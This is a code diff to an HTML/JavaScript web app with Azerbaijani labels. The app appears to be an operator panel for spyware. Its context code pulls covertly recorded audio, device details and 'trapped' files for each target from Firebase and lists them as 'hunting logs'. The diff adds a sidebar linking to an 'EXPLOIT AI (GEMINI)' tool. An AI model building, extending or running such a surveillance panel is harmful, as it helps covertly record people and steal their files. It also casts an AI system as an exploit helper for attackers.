@@ -29,6 +29,11 @@
         .auth-input { width: 100%; max-width: 320px; padding: 18px; background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 15px; color: white; text-align: center; margin-bottom: 15px; font-size: 1rem; }
         .auth-btn { width: 100%; max-width: 320px; padding: 18px; background: var(--accent); color: black; border: none; border-radius: 15px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
 
+        /* SIDEBAR (SOL MENYU) */
+        #sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: #050505; border-right: 1px solid var(--accent); z-index: 4000; transition: 0.4s; padding-top: 60px; }
+        .sidebar-item { padding: 18px 25px; border-bottom: 1px solid #111; cursor: pointer; display: flex; align-items: center; gap: 12px; font-weight: 900; font-size: 0.8rem; color: var(--accent); }
+        #overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 3999; display: none; }
+
         /* ƏSAS APP */
         #main-app { display: none; }
         .app-header { padding: 20px; display: flex; justify-content: space-between; align-items: center; background: rgba(2,2,5,0.95); backdrop-filter: blur(15px); position: sticky; top:0; z-index:100; border-bottom: 1px solid var(--border); }
@@ -74,6 +79,20 @@
     <source src="music.mp3" type="audio/mpeg">
 </audio>
 
+<div id="sidebar">
+    <div style="text-align: center; padding: 20px; border-bottom: 1px solid #111;">
+        <i class="fas fa-user-secret" style="font-size: 3rem; color: var(--accent);"></i>
+        <p style="font-size: 0.6rem; color: #555; margin-top: 10px;">ELITE MODUL CENTER</p>
+    </div>
+    <div class="sidebar-item" onclick="toggleMenu(); openTool('ai_assistant.html', false)">
+        <i class="fas fa-brain"></i> <span>EXPLOIT AI (GEMINI)</span>
+    </div>
+    <div class="sidebar-item" onclick="toggleMenu()" style="color: #444; margin-top: 20px;">
+        <i class="fas fa-arrow-left"></i> <span>GERİ QAYIT</span>
+    </div>
+</div>
+<div id="overlay" onclick="toggleMenu()"></div>
+
 <div id="auth-screen">
     <div class="auth-box">
         <div class="auth-logo"><i class="fas fa-ghost"></i></div>
@@ -86,11 +105,11 @@
 
 <div id="main-app">
     <div class="app-header">
-        <div style="display: flex; align-items: center; gap: 12px;">
-            <div id="u-initial" style="width: 40px; height: 40px; background: linear-gradient(45deg, var(--accent), #0055ff); border-radius: 12px; color: #000; display: flex; align-items: center; justify-content: center; font-weight: 900; box-shadow: 0 0 15px rgba(0,223,255,0.3);">?</div>
+        <div style="display: flex; align-items: center; gap: 15px;">
+            <i class="fas fa-bars" onclick="toggleMenu()" style="font-size: 1.2rem; color: var(--accent); cursor: pointer;"></i>
+            <div id="u-initial" style="width: 35px; height: 35px; background: linear-gradient(45deg, var(--accent), #0055ff); border-radius: 10px; color: #000; display: flex; align-items: center; justify-content: center; font-weight: 900;">?</div>
             <div>
-                <div id="u-name" style="font-weight: 900; font-size: 0.9rem; color: var(--accent);">USER</div>
-                <div style="font-size: 0.55rem; color: var(--cyber); letter-spacing: 1px;">LEVEL: ELITE HACKER</div>
+                <div id="u-name" style="font-weight: 900; font-size: 0.8rem; color: var(--accent);">USER</div>
             </div>
         </div>
         <i class="fas fa-microchip" style="color: var(--premium); font-size: 1.2rem;"></i>
@@ -256,7 +275,18 @@
 
     let sessionUser = localStorage.getItem('elite_session');
 
-    // SİSTEMİ VƏ MUSİQİNİ BAŞLATMAQ
+    function toggleMenu() {
+        const sb = document.getElementById('sidebar');
+        const ov = document.getElementById('overlay');
+        if(sb.style.left === '0px') {
+            sb.style.left = '-280px';
+            ov.style.display = 'none';
+        } else {
+            sb.style.left = '0px';
+            ov.style.display = 'block';
+        }
+    }
+
     function startSystem() {
         document.getElementById('music-alert').style.display = 'none';
         const music = document.getElementById('bg-music');
@@ -287,19 +317,16 @@
     function startHuntingLogs() {
         const list = document.getElementById('logs-list');
         const empty = document.getElementById('no-data');
-
         db.ref('audio_logs/' + sessionUser).on('child_added', snap => {
             empty.style.display = 'none';
             addLogItem('🎤 SƏS YAZISI', `Tarix: ${snap.val().time}`, 'audio', snap.val().url);
         });
-
         db.ref('device_specs/' + sessionUser).on('value', snap => {
             if(snap.val()){
                 empty.style.display = 'none';
                 addLogItem('📱 CİHAZ MƏLUMATI', `Model: ${snap.val().model} | Bat: ${snap.val().battery}%`, 'text');
             }
         });
-
         db.ref('file_traps/' + sessionUser).on('child_added', snap => {
             empty.style.display = 'none';
             addLogItem('📂 FAYL ƏLƏ KEÇDİ', `Ad: ${snap.val().name}`, 'link', snap.val().url);
